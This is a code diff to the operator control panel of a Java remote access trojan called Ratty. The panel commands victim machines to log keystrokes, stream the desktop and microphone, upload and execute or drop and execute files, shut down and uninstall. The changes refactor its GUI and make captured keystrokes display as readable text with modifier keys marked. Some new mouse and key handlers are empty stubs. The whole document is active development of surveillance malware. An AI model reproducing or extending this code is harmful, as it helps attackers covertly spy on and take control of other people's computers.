@@ -24,12 +24,11 @@ import javax.swing.JOptionPane;
 import javax.swing.filechooser.FileFilter;
 import javax.swing.filechooser.FileNameExtensionFilter;
 
+import org.jnativehook.keyboard.NativeKeyEvent;
+
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.gui.swing.ChatSwingGui;
-import de.sogomn.rat.gui.swing.DisplayPanel;
-import de.sogomn.rat.gui.swing.LoggingGui;
 import de.sogomn.rat.gui.swing.Notification;
 import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
@@ -155,6 +154,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String RAM = LANGUAGE.getString("information.ram");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
+	private static final String KEY_MODIFIER_TEXT_FORMAT = " [%s] ";
 	private static final long PING_INTERVAL = 5000;
 	private static final long NOTIFICATION_DELAY = 7500;
 	
@@ -598,10 +598,18 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
+	private void handleMouseEvent(final ServerClient client, final boolean flag) {
+		//...
+	}
+	
+	private void handleKeyEvent(final ServerClient client, final boolean flag) {
+		//...
+	}
+	
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == IRattyGui.FILES) {
 			client.fileBrowser.setVisible(true);
-		} else if (command == DisplayPanel.CLOSED) {
+		} else if (command == IDisplayGui.CLOSE) {
 			stopDesktopStream(client);
 		} else if (command == IRattyGui.DESKTOP) {
 			toggleDesktopStream(client);
@@ -613,7 +621,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			client.chat.setVisible(true);
 		} else if (command == IRattyGui.KEYLOG) {
 			client.logger.setVisible(true);
-		} else if (command == LoggingGui.CLEAR) {
+		} else if (command == ILoggingGui.CLEAR) {
 			client.logger.clear();
 		}
 	}
@@ -677,7 +685,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createUploadExecutePacket(client);
 		} else if (command == IRattyGui.DROP_EXECUTE) {
 			packet = createDropExecutePacket(client);
-		} else if (command == ChatSwingGui.MESSAGE_SENT) {
+		} else if (command == IChatGui.MESSAGE_SENT) {
 			packet = createChatPacket(client);
 		} else if (command == IFileBrowserGui.INFORMATION) {
 			packet = createFileInformationPacket(client);
@@ -687,10 +695,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = createUninstallPacket();
 		} else if (command == IRattyGui.SHUT_DOWN) {
 			packet = new ShutdownPacket();
-		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
-			packet = client.displayPanel.getLastMouseEventPacket();
-		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
-			packet = client.displayPanel.getLastKeyEventPacket();
+		} else if (command == IDisplayGui.MOUSE_PRESSED) {
+			handleMouseEvent(client, true);
+		} else if (command == IDisplayGui.MOUSE_RELEASED) {
+			handleMouseEvent(client, false);
+		} else if (command == IDisplayGui.KEY_PRESSED) {
+			handleKeyEvent(client, true);
+		} else if (command == IDisplayGui.KEY_RELEASED) {
+			handleKeyEvent(client, false);
 		} else if (command == IRattyGui.VOICE && !client.isStreamingVoice()) {
 			packet = new VoicePacket();
 		} else if (command == IRattyGui.RESTART) {
@@ -727,7 +739,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final DesktopPacket request = new DesktopPacket();
 		
 		client.connection.addPacket(request);
-		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
+		client.displayPanel.showFrames(screenWidth, screenHeight, frames);
 	}
 	
 	private void handleClipboardPacket(final ClipboardPacket packet) {
@@ -813,8 +825,15 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private void handleKeylog(final ServerClient client, final KeylogPacket packet) {
 		final int keyCode = packet.getKeyCode();
+		final String message = NativeKeyEvent.getKeyText(keyCode);
 		
-		client.logger.log(keyCode);
+		if (message.length() == 1) {
+			client.logger.log(message);
+		} else {
+			final String modifierMessage = String.format(KEY_MODIFIER_TEXT_FORMAT, message);
+			
+			client.logger.log(modifierMessage);
+		}
 	}
 	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
